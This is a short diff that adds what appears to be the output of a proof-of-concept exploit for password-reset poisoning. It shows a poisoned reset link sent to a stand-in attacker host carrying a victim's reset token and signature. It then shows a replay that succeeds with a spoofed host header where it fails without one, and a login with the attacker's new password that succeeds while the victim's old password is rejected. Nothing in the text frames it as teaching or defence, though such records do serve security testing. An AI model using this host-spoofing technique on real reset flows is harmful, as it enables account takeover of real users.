@@ -1,0 +1,9 @@
+Poisoned reset link (from mail log):
+https://evil.attacker.tld/admin/password-reset/reset?email=victim_8c6f32df%40example.invalid&token=8069c73ead4d5f86183988e559e56a905df3875a9a0c668b88a9642a304c12da&signature=ae8b03706fbeb5c8fc1cfa9adc722815790272ba2c36aa1b5669ffed10f42c63
+
+Replay WITHOUT host spoof: HTTP 403 (signature enforced)
+Replay WITH host spoof:    HTTP 200 (signature bypassed)
+resetPassword: HTTP 200
+
+Login with attacker's NEW password: True
+Login with victim's OLD password:   False
